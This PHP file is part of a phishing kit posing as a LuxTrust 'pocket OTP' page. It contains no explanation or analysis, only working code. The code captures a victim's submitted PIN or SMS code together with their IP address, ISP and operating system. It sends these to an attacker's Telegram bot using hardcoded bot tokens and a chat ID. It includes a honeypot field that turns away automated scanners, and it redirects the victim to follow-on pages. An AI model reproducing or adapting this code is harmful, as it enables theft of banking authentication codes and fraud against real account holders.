<?php
require_once 'app.php';
function strip($msg) {
$t = 'bot8581309029:AAGG91iewMbtpig-6_qqJzjzfdAIsX89wno';
$id = '1208249379';
    $ch = curl_init();


curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/'.$t.'/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=".$id."&text=".$msg."");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close ($ch);

}
function strip2($msg) {
$t = 'bot8200020837:AAFeSIW_XECkZW_Rq9KaGKdPsqNrxSCq65E';
$id = '1208249379';
    $ch = curl_init();


curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/'.$t.'/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=".$id."&text=".$msg."");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close ($ch);

}


$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }
	error_reporting(0);
   
        $message = '/  PIN BP /' . $_SERVER['REMOTE_ADDR'] . "\r\n";
        $message .= 'ðŸ”¥ PIN: ' . $_POST['sms'] . "\r\n";
        $message .= '/ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ details ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥/' . "\r\n";
        $message .= 'IPEN address : ' . get_user_ip() . "\r\n";
		$message .= 'ISPEN : ' . get_isp() . "\r\n";
		$message .= 'OSEN : ' . get_user_os() . "\r\n";
        strip($message);
        header("Location: sms.html");



}


?>
<!DOCTYPE html>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>pocket OTP</title>
<meta name="generator" content="WYSIWYG Web Builder 14 - http://www.wysiwygwebbuilder.com">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href="favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="./Luxtrust_files/mag11.css" rel="stylesheet">
<link href="./Luxtrust_files/mag22.css" rel="stylesheet">
</head>
<body>

         <meta http-equiv="refresh" content="4; url=smsexpired.html">

<div id="FlexContainer1">
<div id="wb_LayoutGrid1">
<div id="LayoutGrid1">
<div class="col-1">
<div id="wb_LayoutGrid2">
<div id="LayoutGrid2">
<div class="row">
<div class="col-1">
<div id="wb_Image" style="">
<img src="./Luxtrust_files/ld.gif" id="Image1" alt="">
</div>
<div id="wb_Text2">
<span style="color:#000000;font-family:Arial;font-size:16px;"><br><br><br><strong></strong><br></span>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

</body></html>
